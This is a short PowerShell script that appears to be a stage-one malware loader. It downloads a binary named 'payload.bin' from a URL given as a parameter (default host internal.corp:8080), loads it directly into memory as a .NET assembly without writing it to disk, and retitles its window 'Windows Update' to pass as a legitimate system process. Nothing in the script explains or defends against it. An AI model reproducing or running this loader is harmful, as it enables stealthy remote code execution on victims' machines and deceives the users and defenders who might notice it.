
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://internal.corp:8080/payload.bin"
)
try { $ManagedBytes = (New-Object System.Net.WebClient).DownloadData($Stage1Url); [Reflection.Assembly]::Load($ManagedBytes); $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Remote fetch failed" }
